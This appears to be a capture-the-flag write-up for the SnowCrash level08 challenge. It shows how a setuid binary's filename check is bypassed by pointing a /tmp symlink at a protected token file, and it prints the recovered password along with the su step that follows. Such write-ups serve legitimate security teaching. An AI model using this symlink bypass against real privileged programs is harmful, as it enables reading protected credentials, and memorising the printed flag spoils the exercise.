level08@SnowCrash:~$ ls -laH
-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
-rw-------  1 flag08  flag08    26 Mar  5  2016 token

strings level08
[...]
[^_]
%s [file to read]
token
You may not access '%s'
Unable to open %s
Unable to read fd %d
;*2$"
[...]

so level08 takes a file to open as argument

nano /tmp/test.txt
	Hello World !

./level08 /tmp/test.txt
Hello World !

level08 prints the content of a file so we need to somehow make it work with the "token" file
(You may not access 'token' for now)

- Verified with :
level08@SnowCrash:~$ ltrace ./level08
[...]
printf("%s [file to read]\n", "./level08"./level08 [file to read]
)                      = 25
[...]

level08@SnowCrash:~$ ln -s /home/user/level08/token /tmp/syml.txt
level08@SnowCrash:~$ ./level08 /tmp/syml.txt
quif5eloekouj29ke0vouxean

level08 checks you have permission to open the file, by creating a symbolic link it passes
the verification while still reading ~/token

su flag08 with "quif5eloekouj29ke0vouxean" as password and "getflag"
